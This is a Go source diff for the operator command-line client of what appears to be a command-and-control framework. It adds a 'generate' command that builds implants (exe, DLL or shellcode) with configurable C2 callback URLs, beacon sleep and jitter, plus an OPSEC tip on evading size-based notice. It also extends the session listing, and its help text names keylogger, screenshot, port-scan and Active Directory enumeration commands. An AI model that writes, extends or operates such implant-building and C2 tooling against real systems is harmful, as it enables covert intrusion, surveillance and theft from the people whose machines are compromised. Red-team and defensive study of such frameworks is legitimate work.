@@ -3,6 +3,7 @@ package operatorcli
 import (
 	"context"
 	"fmt"
+	"os"
 	"strconv"
 	"strings"
 	"time"
@@ -42,6 +43,7 @@ func (c *Commands) Handlers() map[string]CommandHandler {
 		"ifconfig":  c.cmdIfconfig,
 		"portscan":  c.cmdPortscan,
 		"sleep":     c.cmdSleep,
+		"generate":  c.cmdGenerate,
 		"tasks":     c.cmdTasks,
 		"result":    c.cmdResult,
 		"loot":      c.cmdLoot,
@@ -89,14 +91,34 @@ func (c *Commands) cmdSessions(_ []string) error {
 		fmt.Println("No active sessions")
 		return nil
 	}
-	fmt.Printf("%-36s %-15s %-12s %-8s %-10s %-6s\n", "SESSION", "HOSTNAME", "USER", "OS", "TRANSPORT", "ALIVE")
+	now := time.Now().Unix()
+	fmt.Printf("%-20s %-14s %-12s %-8s %-8s %-6s %s\n",
+		"SESSION", "HOSTNAME", "USER", "OS", "XPORT", "ALIVE", "LAST_CHECKIN")
 	for _, s := range resp.Sessions {
 		alive := "yes"
 		if !s.Alive {
 			alive = "no"
 		}
-		fmt.Printf("%-36s %-15s %-12s %-8s %-10s %-6s\n",
-			s.SessionId, s.Hostname, s.Username, s.Os, s.Transport, alive)
+		age := "n/a"
+		if s.LastCheckin > 0 {
+			sec := now - s.LastCheckin
+			if sec < 0 {
+				sec = 0
+			}
+			if sec < 60 {
+				age = fmt.Sprintf("%ds ago", sec)
+			} else if sec < 3600 {
+				age = fmt.Sprintf("%dm ago", sec/60)
+			} else {
+				age = fmt.Sprintf("%dh ago", sec/3600)
+			}
+		}
+		sid := s.SessionId
+		if len(sid) > 18 {
+			sid = sid[:18] + "…"
+		}
+		fmt.Printf("%-20s %-14s %-12s %-8s %-8s %-6s %s\n",
+			sid, s.Hostname, s.Username, s.Os, s.Transport, alive, age)
 	}
 	return nil
 }
@@ -283,6 +305,9 @@ func (c *Commands) cmdSleep(args []string) error {
 	if err != nil {
 		return fmt.Errorf("invalid sleep ms: %s", args[0])
 	}
+	if ms < 100 {
+		return fmt.Errorf("sleep ms must be >= 100 (got %d)", ms)
+	}
 	var jitter int32
 	if len(args) > 1 {
 		j, err := strconv.ParseInt(args[1], 10, 32)
@@ -296,7 +321,148 @@ func (c *Commands) cmdSleep(args []string) error {
 	if err != nil {
 		return err
 	}
-	fmt.Printf("Sleep task queued: %s\n", resp.TaskId)
+	fmt.Printf("Sleep task queued: %s (interval=%dms jitter=%d%% — server will advertise this interval)\n",
+		resp.TaskId, ms, jitter)
+	return nil
+}
+
+// cmdGenerate builds an implant via GenerateImplant RPC.
+// usage: generate [--os windows|linux] [--arch amd64] [--format exe|dll|shellcode]
+//
+//	[--sleep ms] [--jitter pct] [--callback URL] [--language go|c] [--out path]
+func (c *Commands) cmdGenerate(args []string) error {
+	osName := "linux"
+	arch := "amd64"
+	format := "exe"
+	sleepMs := int64(500)
+	jitter := int32(10)
+	language := "go"
+	outPath := ""
+	var callbacks []string
+
+	for i := 0; i < len(args); i++ {
+		a := args[i]
+		need := func(flag string) (string, error) {
+			if i+1 >= len(args) {
+				return "", fmt.Errorf("%s requires a value", flag)
+			}
+			i++
+			return args[i], nil
+		}
+		switch a {
+		case "--os", "-os":
+			v, err := need(a)
+			if err != nil {
+				return err
+			}
+			osName = v
+		case "--arch", "-arch":
+			v, err := need(a)
+			if err != nil {
+				return err
+			}
+			arch = v
+		case "--format", "-format":
+			v, err := need(a)
+			if err != nil {
+				return err
+			}
+			format = v
+		case "--sleep", "-sleep":
+			v, err := need(a)
+			if err != nil {
+				return err
+			}
+			ms, err := strconv.ParseInt(v, 10, 64)
+			if err != nil {
+				return fmt.Errorf("invalid --sleep: %s", v)
+			}
+			sleepMs = ms
+		case "--jitter", "-jitter":
+			v, err := need(a)
+			if err != nil {
+				return err
+			}
+			j, err := strconv.ParseInt(v, 10, 32)
+			if err != nil {
+				return fmt.Errorf("invalid --jitter: %s", v)
+			}
+			jitter = int32(j)
+		case "--callback", "-callback":
+			v, err := need(a)
+			if err != nil {
+				return err
+			}
+			callbacks = append(callbacks, v)
+		case "--language", "-language", "--lang":
+			v, err := need(a)
+			if err != nil {
+				return err
+			}
+			language = v
+		case "--out", "-o":
+			v, err := need(a)
+			if err != nil {
+				return err
+			}
+			outPath = v
+		case "-h", "--help":
+			fmt.Println(`usage: generate [options]
+  --os windows|linux|darwin   target OS (default linux)
+  --arch amd64|arm64          target arch (default amd64)
+  --format exe|dll|shellcode  output format (default exe)
+  --sleep ms                  beacon sleep (default 500)
+  --jitter pct                jitter percent (default 10)
+  --callback URL              C2 callback (repeatable)
+  --language go|c             implant language (default go; c = windows/amd64 only)
+  --out path                  write binary to path (default ./<filename>)`)
+			return nil
+		default:
+			return fmt.Errorf("unknown generate flag %q (use --help)", a)
+		}
+	}
+
+	if len(callbacks) == 0 {
+		callbacks = []string{"https://127.0.0.1:443"}
+	}
+	if osName == "windows" && language == "go" && format == "exe" {
+		// fine
+	}
+
+	ctx, cancel := context.WithTimeout(context.Background(), 6*time.Minute)
+	defer cancel()
+
+	fmt.Printf("Building implant language=%s os=%s arch=%s format=%s sleep=%dms …\n",
+		language, osName, arch, format, sleepMs)
+
+	resp, err := c.client.GenerateImplant(ctx, &pb.GenerateImplantRequest{
+		Os:         osName,
+		Arch:       arch,
+		Transport:  "https",
+		Callbacks:  callbacks,
+		SleepMs:    sleepMs,
+		JitterPct:  jitter,
+		Format:     format,
+		Language:   language,
+	})
+	if err != nil {
+		return err
+	}
+	if !resp.Success {
+		return fmt.Errorf("generate failed: %s", resp.Error)
+	}
+	if outPath == "" {
+		outPath = resp.Filename
+		if outPath == "" {
+			outPath = "implant.bin"
+		}
+	}
+	if err := os.WriteFile(outPath, resp.Binary, 0o755); err != nil {
+		return fmt.Errorf("write %s: %w", outPath, err)
+	}
+	fmt.Printf("OK build_id=%s format=%s size=%d bytes → %s\n",
+		resp.BuildId, resp.Format, len(resp.Binary), outPath)
+	fmt.Println("OPSEC: Go implants are large (dev/demo). Prefer --language c for Windows engagement PE when toolchain is available.")
 	return nil
 }
 
@@ -525,6 +691,7 @@ func (c *Commands) cmdHelp(_ []string) error {
   ifconfig              - List network interfaces
   portscan <host> <ports> - TCP port scan
   sleep <ms> [jitter]   - Set beacon interval
+  generate [opts]       - Build implant (see: generate --help)
   screenshot            - Take screenshot
   keylog <start|stop|dump> - Keylogger control
   ldap-enum <type> --domain <d> --dc <dc> - LDAP AD enumeration
